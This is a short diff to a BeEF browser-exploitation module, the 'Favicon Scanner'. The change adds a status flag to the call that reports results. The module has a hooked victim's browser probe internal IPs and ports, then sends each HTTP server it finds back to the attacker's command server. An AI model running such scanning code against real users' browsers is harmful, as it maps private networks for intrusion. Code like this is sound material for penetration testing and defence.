@@ -110,7 +110,7 @@ beef.execute(function() {
     img.src = proto+"://"+ip+":"+port+uri;
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
-      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src));dom.removeChild(this);
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
       beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
     }
     dom.appendChild(img);
